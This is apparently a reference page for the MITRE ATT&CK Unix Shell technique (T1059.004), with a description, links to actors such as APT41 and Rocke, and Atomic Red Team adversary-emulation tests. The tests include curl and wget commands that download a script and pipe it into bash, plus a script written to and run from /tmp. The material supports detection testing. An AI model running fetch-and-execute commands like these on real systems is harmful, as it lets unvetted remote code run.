
# Unix Shell

## Description

### MITRE Description

> Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'root']
* Platforms: ['macOS', 'Linux']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1059/004

## Potential Commands

```
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
```

## Commands Dataset

```
[{'command': 'sh -c "echo \'echo Hello from the Atomic Red Team\' > '
             '/tmp/art.sh"\n'
             'sh -c "echo \'ping -c 4 8.8.8.8\' >> /tmp/art.sh"\n'
             'chmod +x /tmp/art.sh\n'
             'sh /tmp/art.sh\n',
  'name': None,
  'source': 'atomics/T1059.004/T1059.004.yaml'},
 {'command': 'curl -sS '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh '
             '| bash\n'
             'wget --quiet -O - '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh '
             '| bash\n',
  'name': None,
  'source': 'atomics/T1059.004/T1059.004.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Command and Scripting Interpreter: Bash': {'atomic_tests': [{'auto_generated_guid': '7e7ac3ed-f795-4fa5-b711-09d6fbe9b873',
                                                                                       'description': 'Creates '
                                                                                                      'and '
                                                                                                      'executes '
                                                                                                      'a '
                                                                                                      'simple '
                                                                                                      'bash '
                                                                                                      'script.\n',
                                                                                       'executor': {'cleanup_command': 'rm '
                                                                                                                       '#{script_path}\n',
                                                                                                    'command': 'sh '
                                                                                                               '-c '
                                                                                                               '"echo '
                                                                                                               "'echo "
                                                                                                               'Hello '
                                                                                                               'from '
                                                                                                               'the '
                                                                                                               'Atomic '
                                                                                                               'Red '
                                                                                                               "Team' "
                                                                                                               '> '
                                                                                                               '#{script_path}"\n'
                                                                                                               'sh '
                                                                                                               '-c '
                                                                                                               '"echo '
                                                                                                               "'ping "
                                                                                                               '-c '
                                                                                                               '4 '
                                                                                                               "8.8.8.8' "
                                                                                                               '>> '
                                                                                                               '#{script_path}"\n'
                                                                                                               'chmod '
                                                                                                               '+x '
                                                                                                               '#{script_path}\n'
                                                                                                               'sh '
                                                                                                               '#{script_path}\n',
                                                                                                    'name': 'sh'},
                                                                                       'input_arguments': {'script_path': {'default': '/tmp/art.sh',
                                                                                                                           'description': 'Script '
                                                                                                                                          'path',
                                                                                                                           'type': 'path'}},
                                                                                       'name': 'Create '
                                                                                               'and '
                                                                                               'Execute '
                                                                                               'Bash '
                                                                                               'Shell '
                                                                                               'Script',
                                                                                       'supported_platforms': ['macos',
                                                                                                               'linux']},
                                                                                      {'auto_generated_guid': 'd0c88567-803d-4dca-99b4-7ce65e7b257c',
                                                                                       'description': 'Using '
                                                                                                      'Curl '
                                                                                                      'to '
                                                                                                      'download '
                                                                                                      'and '
                                                                                                      'pipe '
                                                                                                      'a '
                                                                                                      'payload '
                                                                                                      'to '
                                                                                                      'Bash. '
                                                                                                      'NOTE: '
                                                                                                      'Curl-ing '
                                                                                                      'to '
                                                                                                      'Bash '
                                                                                                      'is '
                                                                                                      'generally '
                                                                                                      'a '
                                                                                                      'bad '
                                                                                                      'idea '
                                                                                                      'if '
                                                                                                      'you '
                                                                                                      "don't "
                                                                                                      'control '
                                                                                                      'the '
                                                                                                      'server.\n'
                                                                                                      '\n'
                                                                                                      'Upon '
                                                                                                      'successful '
                                                                                                      'execution, '
                                                                                                      'sh '
                                                                                                      'will '
                                                                                                      'download '
                                                                                                      'via '
                                                                                                      'curl '
                                                                                                      'and '
                                                                                                      'wget '
                                                                                                      'the '
                                                                                                      'specified '
                                                                                                      'payload '
                                                                                                      '(echo-art-fish.sh) '
                                                                                                      'and '
                                                                                                      'set '
                                                                                                      'a '
                                                                                                      'marker '
                                                                                                      'file '
                                                                                                      'in '
                                                                                                      '`/tmp/art-fish.txt`.\n',
                                                                                       'executor': {'cleanup_command': 'rm '
                                                                                                                       '/tmp/art-fish.txt\n',
                                                                                                    'command': 'curl '
                                                                                                               '-sS '
                                                                                                               'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh '
                                                                                                               '| '
                                                                                                               'bash\n'
                                                                                                               'wget '
                                                                                                               '--quiet '
                                                                                                               '-O '
                                                                                                               '- '
                                                                                                               'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh '
                                                                                                               '| '
                                                                                                               'bash\n',
                                                                                                    'name': 'sh'},
                                                                                       'name': 'Command-Line '
                                                                                               'Interface',
                                                                                       'supported_platforms': ['macos',
                                                                                                               'linux']}],
                                                                     'attack_technique': 'T1059.004',
                                                                     'display_name': 'Command '
                                                                                     'and '
                                                                                     'Scripting '
                                                                                     'Interpreter: '
                                                                                     'Bash'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations


* [Execution Prevention](../mitigations/Execution-Prevention.md)


# Actors


* [APT41](../actors/APT41.md)

* [Rocke](../actors/Rocke.md)
    
